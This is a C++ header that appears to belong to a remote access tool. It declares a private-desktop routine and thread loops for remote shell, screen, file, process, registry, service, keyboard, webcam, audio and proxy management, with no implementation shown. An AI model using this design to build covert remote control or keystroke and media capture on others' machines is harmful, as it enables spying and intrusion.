#pragma once
#include "StdAfx.h"
#include "IOCPClient.h"
#include "common/commands.h"

typedef struct _THREAD_ARG_LIST {
    DWORD (WINAPI *StartAddress)(LPVOID lParameter);
    LPVOID  lParam;
    bool	bInteractive; // 是否支持交互桌面  ??
    HANDLE	hEvent;
} THREAD_ARG_LIST, *LPTHREAD_ARG_LIST;

typedef struct UserParam {
    BYTE* buffer;
    int length;
    ~UserParam()
    {
        SAFE_DELETE_ARRAY(buffer);
    }
} UserParam;

DWORD WINAPI ThreadProc(LPVOID lParam);
DWORD private_desktop(CONNECT_ADDRESS* conn, const State& exit, const std::string& hash, const std::string& hmac);

DWORD WINAPI LoopShellManager(LPVOID lParam);
DWORD WINAPI LoopScreenManager(LPVOID lParam);
DWORD WINAPI LoopFileManager(LPVOID lParam);
DWORD WINAPI LoopTalkManager(LPVOID lParam);
DWORD WINAPI LoopProcessManager(LPVOID lParam);
DWORD WINAPI LoopWindowManager(LPVOID lParam);
DWORD WINAPI LoopVideoManager(LPVOID lParam);
DWORD WINAPI LoopAudioManager(LPVOID lParam);
DWORD WINAPI LoopRegisterManager(LPVOID lParam);
DWORD WINAPI LoopServicesManager(LPVOID lParam);
DWORD WINAPI LoopKeyboardManager(LPVOID lParam);
DWORD WINAPI LoopProxyManager(LPVOID lParam);
